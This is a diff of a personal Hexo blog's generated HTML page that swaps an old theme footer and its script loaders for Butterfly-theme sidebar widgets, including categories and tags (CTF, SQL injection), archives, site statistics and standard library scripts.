-                    
-                    <li class="list-inline-item">
-                        <a href="\#">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-rss"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
-            </div>
-        </div>
-    </div>
-</footer>
-
-<!-- After footer scripts -->
-
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
-
-<script src="/js/main.js"></script>
-
-
-<!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
-
-
-
-</body>
-
-</html>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/"><span class="card-category-list-name">CSS</span><span class="card-category-list-count">1</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">40</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/linux/"><span class="card-category-list-name">linux</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ping/"><span class="card-category-list-name">ping</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">sql注入</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">手动注入</span><span class="card-category-list-count">1</span></a></li></ul></li></ul></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: #999">手动注入</a> <a href="/tags/ing/" style="font-size: 1.43em; color: #99a6b9">ing</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.3em; color: #99a1ac">sql注入</a> <a href="/tags/Javaweb/" style="font-size: 1.1em; color: #999">Javaweb</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 1.1em; color: #999">系统</a> <a href="/tags/%E5%AF%86%E9%92%A5/" style="font-size: 1.1em; color: #999">密钥</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 1.1em; color: #999">信息泄露</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1.1em; color: #999">远程登录服务器</a> <a href="/tags/%E5%88%86%E7%9B%98/" style="font-size: 1.1em; color: #999">分盘</a> <a href="/tags/Hive/" style="font-size: 1.1em; color: #999">Hive</a> <a href="/tags/mysql/" style="font-size: 1.1em; color: #999">mysql</a> <a href="/tags/%E8%BF%9B%E5%88%B6/" style="font-size: 1.1em; color: #999">进制</a> <a href="/tags/tmux/" style="font-size: 1.1em; color: #999">tmux</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/" style="font-size: 1.1em; color: #999">脚本小子</a> <a href="/tags/phpstudy/" style="font-size: 1.1em; color: #999">phpstudy</a> <a href="/tags/Hadoop/" style="font-size: 1.1em; color: #999">Hadoop</a> <a href="/tags/CSS/" style="font-size: 1.1em; color: #999">CSS</a> <a href="/tags/go/" style="font-size: 1.3em; color: #99a1ac">go</a> <a href="/tags/PHP/" style="font-size: 1.3em; color: #99a1ac">PHP</a> <a href="/tags/ping/" style="font-size: 1.1em; color: #999">ping</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.1em; color: #999">编码</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/" style="font-size: 1.1em; color: #999">数据可视化</a> <a href="/tags/HTML/" style="font-size: 1.17em; color: #999c9f">HTML</a> <a href="/tags/awd/" style="font-size: 1.1em; color: #999">awd</a> <a href="/tags/%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">网站备份漏洞</a> <a href="/tags/github/" style="font-size: 1.1em; color: #999">github</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.37em; color: #99a4b2">数据库</a> <a href="/tags/hadoop/" style="font-size: 1.23em; color: #999ea6">hadoop</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: #999">机器学习</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.1em; color: #999">实战</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/Java/" style="font-size: 1.17em; color: #999c9f">Java</a> <a href="/tags/linux/" style="font-size: 1.37em; color: #99a4b2">linux</a> <a href="/tags/acm%E7%AE%97%E6%B3%95/" style="font-size: 1.23em; color: #999ea6">acm算法</a> <a href="/tags/vim/" style="font-size: 1.1em; color: #999">vim</a> <a href="/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/" style="font-size: 1.1em; color: #999">磁盘管理</a> <a href="/tags/ssh/" style="font-size: 1.1em; color: #999">ssh</a> <a href="/tags/IP/" style="font-size: 1.1em; color: #999">IP</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/" style="font-size: 1.23em; color: #999ea6">文件修复</a> <a href="/tags/goweb/" style="font-size: 1.1em; color: #999">goweb</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">106</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-15T05:56:43.525Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div><div class="card-widget user-map" id="user-map"><div class="item-headline"><i class="fas fa-heartbeat"></i><span>訪客地圖</span></div><div class="item-content"></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
